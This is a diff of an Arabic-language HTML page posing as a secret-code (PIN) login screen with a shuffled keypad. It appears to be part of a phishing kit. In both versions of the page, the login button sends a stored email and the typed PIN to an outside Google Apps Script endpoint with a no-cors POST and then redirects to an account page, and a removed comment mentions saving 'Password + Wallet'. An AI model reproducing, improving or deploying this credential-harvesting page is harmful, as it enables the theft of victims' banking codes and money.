@@ -3,141 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>الرمز السري</title>
     <style>
         body { font-family: sans-serif; margin: 0; background-color: #EAF0E9; display: flex; justify-content: center; min-height: 100vh; }
-        .main-container { width: 100%; max-width: 400px; padding: 40px 20px; display: flex; flex-direction: column; }
-        
-        .header-title { font-size: 22px; font-weight: bold; margin-bottom: 25px; text-align: right; }
-        
-        /* حقل إدخال الرمز */
-        .password-display {
-            width: 100%; padding: 18px; border: 1px solid #c8d1c7; border-radius: 12px;
-            font-size: 18px; text-align: right; background-color: #fff; margin-bottom: 15px;
-            box-sizing: border-box; color: #333; height: 60px; outline: none;
-        }
-
-        .info-links { display: flex; flex-direction: column; align-items: flex-end; gap: 10px; margin-bottom: 30px; }
-        .info-link { text-decoration: underline; color: #000; font-size: 15px; font-weight: bold; display: flex; align-items: center; gap: 5px; cursor: pointer; }
-        
-        /* زر ولوج */
-        .login-btn {
-            width: 100%; background-color: #ffffff; color: #ccc; border: 1px solid #c8d1c7;
-            padding: 16px; border-radius: 15px; font-size: 20px; font-weight: bold;
-            cursor: not-allowed; margin-bottom: 30px; transition: 0.3s;
-        }
-        .login-btn.active { background-color: #2EAF4A; color: #ffffff; border: none; cursor: pointer; }
-
-        /* لوحة الأرقام العشوائية */
-        .keypad {
-            display: grid; grid-template-columns: repeat(4, 1fr); border: 1px solid #c8d1c7; background-color: #fff;
-        }
-        .key {
-            padding: 20px 0; text-align: center; font-size: 22px; font-weight: bold;
-            border: 0.5px solid #c8d1c7; cursor: pointer; user-select: none;
-        }
-        .key:active { background-color: #f0f0f0; }
-        .key.empty { background-color: #f9f9f9; cursor: default; }
+        .main-container { width: 100%; max-width: 400px; padding: 40px 20px; }
+        .password-display { width: 100%; padding: 18px; border: 1px solid #c8d1c7; border-radius: 12px; font-size: 18px; text-align: right; background: #fff; margin-bottom: 20px; height: 60px; }
+        .login-btn { width: 100%; background-color: #fff; color: #ccc; border: 1px solid #c8d1c7; padding: 16px; border-radius: 15px; font-size: 20px; font-weight: bold; cursor: not-allowed; }
+        .login-btn.active { background-color: #2EAF4A; color: #fff; border: none; cursor: pointer; }
+        .keypad { display: grid; grid-template-columns: repeat(4, 1fr); border: 1px solid #c8d1c7; background: #fff; margin-top: 30px; }
+        .key { padding: 20px 0; text-align: center; font-size: 22px; font-weight: bold; border: 0.5px solid #c8d1c7; cursor: pointer; }
     </style>
 </head>
 <body>
-
 <div class="main-container">
-    <div class="header-title">الرمز السري</div>
-    
-    <input type="password" id="passInput" class="password-display" placeholder="المرجو إدخال الرمز السري" readonly>
-    
-    <div class="info-links">
-        <div class="info-link">
-            <span>ما المقصود بالرمز السري؟</span>
-            <span style="border: 2px solid #000; border-radius: 50%; width: 18px; height: 18px; display: flex; justify-content: center; align-items: center; font-size: 12px;">i</span>
-        </div>
-        <div class="info-link">نسيتم الرمز السري؟</div>
-    </div>
-
+    <div style="font-weight:bold; margin-bottom:15px;">الرمز السري</div>
+    <input type="password" id="passInput" class="password-display" readonly>
     <button id="finalBtn" class="login-btn" disabled>ولوج</button>
-
-    <div class="keypad" id="keypad">
-        </div>
+    <div class="keypad" id="keypad"></div>
 </div>
 
 <script>
-    const passInput = document.getElementById('passInput');
-    const finalBtn = document.getElementById('finalBtn');
-    const keypad = document.getElementById('keypad');
-    
-    // تأكد من وضع رابط الـ Apps Script الجديد هنا
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwJVluCdukgUFnQwB9XADRPdAtZwRvifSzlH7hxV-Lr4YiXi7wsftLc_qRQ_hc84FDE2g/exec';
-
     let currentPass = "";
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';
 
-    // توليد لوحة الأرقام بترتيب عشوائي
     function generateKeypad() {
-        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
-        nums = nums.sort(() => Math.random() - 0.5); 
-        
-        keypad.innerHTML = "";
-        
-        // إنشاء 12 خانة (4 أرقام في الصف)
+        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
+        const keypad = document.getElementById('keypad');
         for (let i = 0; i < 12; i++) {
             const keyDiv = document.createElement('div');
             keyDiv.className = 'key';
-            
             if (i < 10) {
-                const val = nums[i];
-                keyDiv.innerText = val;
+                keyDiv.innerText = nums[i];
                 keyDiv.onclick = () => {
                     if (currentPass.length < 6) {
-                        currentPass += val;
-                        passInput.value = "*".repeat(currentPass.length);
-                        checkState();
+                        currentPass += nums[i];
+                        document.getElementById('passInput').value = "*".repeat(currentPass.length);
+                        if(currentPass.length >= 4) { document.getElementById('finalBtn').disabled = false; document.getElementById('finalBtn').classList.add('active'); }
                     }
                 };
-            } else {
-                keyDiv.classList.add('empty');
-                keyDiv.innerText = "";
             }
             keypad.appendChild(keyDiv);
         }
     }
 
-    function checkState() {
-        if (currentPass.length >= 4) {
-            finalBtn.disabled = false;
-            finalBtn.classList.add('active');
-        }
-    }
-
-    finalBtn.addEventListener('click', async () => {
-        const email = localStorage.getItem('storedEmail');
-        if (!email) return alert("خطأ في البيانات");
-
-        finalBtn.innerText = "جاري الحفظ...";
-        finalBtn.disabled = true;
-
-        try {
-            // إرسال البيانات للسكريبت لتحديث الجدول (Password + Wallet)
-            await fetch(scriptURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    email: email,
-                    password: currentPass,
-                    action: "final_login"
-                })
-            });
-
-            // التوجيه النهائي
-            setTimeout(() => {
-                window.location.href = "../UserAccountSystem/Account/";
-            }, 1000);
-        } catch (e) {
-            window.location.href = "../UserAccountSystem/Account/";
-        }
+    document.getElementById('finalBtn').addEventListener('click', async () => {
+        await fetch(scriptURL, {
+            method: 'POST', mode: 'no-cors',
+            body: JSON.stringify({ email: localStorage.getItem('storedEmail'), password: currentPass, action: "final_login" })
+        });
+        window.location.href = "../UserAccountSystem/Account/";
     });
-
     window.onload = generateKeypad;
 </script>
-
 </body>
 </html>
